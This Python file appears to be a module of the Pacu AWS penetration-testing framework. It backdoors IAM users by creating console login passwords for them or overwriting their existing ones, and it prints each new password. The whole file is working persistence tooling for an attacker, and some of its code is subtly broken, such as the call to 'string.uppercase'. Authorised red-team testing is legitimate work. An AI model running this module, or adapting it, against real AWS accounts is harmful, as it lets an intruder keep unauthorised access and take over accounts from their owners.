#!/usr/bin/env python3
import argparse
from random import choice
import string
from botocore.exceptions import ClientError


module_info = {
    # Name of the module (should be the same as the filename)
    'name': 'iam__backdoor_users_password',

    # Name and any other notes about the author
    'author': 'Spencer Gietzen of Rhino Security Labs based on the idea from https://github.com/dagrz/aws_pwn/blob/master/persistence/backdoor_all_users.py',

    # Category of the module. Make sure the name matches an existing category.
    'category': 'PERSIST',

    # One liner description of the module functionality. This shows up when a user searches for modules.
    'one_liner': 'Adds a password to users without one.',

    # Description about what the module does and how it works
    'description': 'This module attempts to add a password to users in the account. If all users are going to be backdoored, if it has not already been run, this module will run "enum_users_roles_policies_groups" to fetch all of the users in the account. Passwords can not be added to user accounts that 1) have a password already or 2) have ever had a password, regardless if it has been used before or not. If the module detects that a user already has a password, they will be ignored.',

    # A list of AWS services that the module utilizes during its execution
    'services': ['IAM'],

    # For prerequisite modules, try and see if any existing modules return the data that is required for your module before writing that code yourself, that way, session data can stay separated and modular.
    'prerequisite_modules': ['iam__enum_users_roles_policies_groups'],

    # Module arguments to autocomplete when the user hits tab
    'arguments_to_autocomplete': ['--usernames', '--update'],
}

parser = argparse.ArgumentParser(add_help=False, description=module_info['description'])

parser.add_argument('--usernames', required=False, default=None, help='A comma-separated list of usernames of users in the AWS account to backdoor. If not supplied, it defaults to every user in the account')
parser.add_argument('--update', required=False, default=False, action='store_true', help='Try to update login profiles instead of creating a new one. This can be used to change other users passwords who already have a login profile.')


def main(args, pacu_main):
    session = pacu_main.get_active_session()

    ###### Don't modify these. They can be removed if you are not using the function.
    args = parser.parse_args(args)
    print = pacu_main.print
    input = pacu_main.input
    fetch_data = pacu_main.fetch_data
    ######

    users = []
    summary_data = {}
    client = pacu_main.get_boto3_client('iam')

    if args.usernames is not None:
        if ',' in args.usernames:
            users = args.usernames.split(',')
        else:
            users = [args.usernames]

    else:
        if fetch_data(['IAM', 'Users'], module_info['prerequisite_modules'][0], '--users') is False:
            print('FAILURE')
            print('  SUB-MODULE EXECUTION FAILED')
            return
        for user in session.IAM['Users']:
            if 'PasswordLastUsed' not in user or args.update:
                users.append(user['UserName'])
    try:
        password_policy = client.get_account_password_policy()
    except:
        # Policy unable to be fetched, set to None so that a 128 char password
        # with all types of characters gets created below
        password_policy = None

    target_user = ''
    password = create_valid_password(password_policy)
    summary_data['backdoored_password_count'] = 0

    if args.update:
        func = 'update_login_profile'
        print('Modifying an IAM user\'s current password')
    else:
        func = 'create_login_profile'
        print('Creating an IAM user password')
    caller = getattr(client, func)

    for user in users:
        if args.usernames is None:
            target_user = input('  User: {} (y/n)? '.format(user))
            if target_user.lower() != 'y':
                continue
        else:
            print('  User: {}'.format(user))

        password = create_valid_password(password_policy)
        try:
            caller(
                UserName=user,
                Password=password,
                PasswordResetRequired=False)
        except ClientError as error:
            code = error.response['Error']['Code']
            if code == 'AccessDenied':
                print('    FAILURE: MISSING NEEDED PERMISSIONS')
            elif code == 'EntityAlreadyExists':
                print('    FAILURE: LOGIN PROFILE ALREADY EXISTS')
            else:
                print('    FAILURE: {}'.format(code))
            quit = input('    Continue? (y/n) ')
            if quit.lower() != 'y':
                print('    Exiting...')
                return summary_data
            continue
        print('    Password successfully changed')
        print('    Password: {}'.format(password))
        summary_data['backdoored_password_count'] += 1
    return summary_data


def summary(data, pacu_main):
    out = ''
    if 'backdoored_password_count' in data:
        count = data['backdoored_password_count']
        out += '  {} user(s) backdoored.\n'.format(count)
    return out


def create_valid_password(password_policy: None) -> str:
    symbols = '!@#$%^&*()_+=-\][{}|;:",./?><`~'
    password = ''.join(choice(string.ascii_lowercase) for _ in range(3))
    try:
        if password_policy['RequireNumbers'] is True:
            password += ''.join(choice(string.digits) for _ in range(3))
        if password_policy['RequireSymbols'] is True:
            password += ''.join(choice(symbols) for _ in range(3))
        if password_policy['RequireUppercaseCharacters'] is True:
            password += ''.join(choice(string.uppercase) for _ in range(3))
        if password_policy['MinimumPasswordLength'] > 0:
            while len(password) < password_policy['MinimumPasswordLength']:
                password += choice(string.digits)
    except:
        # Password policy couldn't be grabbed for some reason, make a max-length
        # password with all types of characters, so no matter what, it will be accepted.
        characters = string.ascii_lowercase + string.ascii_uppercase + string.digits + symbols
        password = ''.join(choice(characters) for _ in range(128))
    return password
